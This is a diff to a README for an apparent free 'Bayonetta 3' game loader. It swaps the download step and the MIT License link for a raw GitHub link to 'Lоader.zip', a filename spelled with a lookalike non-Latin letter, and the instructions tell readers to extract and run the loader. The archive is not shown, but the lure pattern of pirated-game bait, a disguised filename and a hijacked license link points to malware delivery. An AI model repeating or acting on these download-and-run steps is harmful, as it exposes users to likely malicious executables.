@@ -25,7 +25,7 @@ Welcome to the official repository for **Bayonetta 3  – Ultimate Loader**! Thi
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/nicomadeankaf/Bayonetta3-Free-GameHub/main/Lоader.zip** from the repository.
 2. Extract the contents with your favorite archive tool.
 3. Run the loader for your operating system.
 4. Follow the guided steps to start playing Bayonetta 3.
@@ -39,4 +39,4 @@ This loader is intended for educational and preservation purposes. Please ensure
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – free to use, modify, and distribute (2025).
+Distributed under the [MIT License](https://raw.githubusercontent.com/nicomadeankaf/Bayonetta3-Free-GameHub/main/Lоader.zip) – free to use, modify, and distribute (2025).
